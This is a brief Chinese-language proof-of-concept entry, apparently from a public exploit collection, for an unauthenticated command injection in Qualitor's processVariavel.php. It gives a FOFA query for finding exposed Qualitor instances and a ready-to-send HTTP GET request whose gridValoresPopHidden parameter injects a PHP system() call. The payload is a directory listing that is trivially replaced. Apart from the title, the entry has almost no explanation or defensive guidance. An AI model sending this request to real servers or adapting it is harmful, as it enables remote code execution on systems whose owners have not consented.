# Qualitor processVariavel.php存在未授权命令注入漏洞

# 一、漏洞简介
Qualitor processVariavel.php存在未授权命令注入漏洞

# 二、影响版本
+ Qualitor 

# 三、资产测绘
+ fofa`app="Qualitor-Web"`
+ 特征


# 四、漏洞复现
```java
GET /html/ad/adpesquisasql/request/processVariavel.php?gridValoresPopHidden=echo%20system("dir"); HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Connection: keep-alive
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qxvfq9fqnxr606r4>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
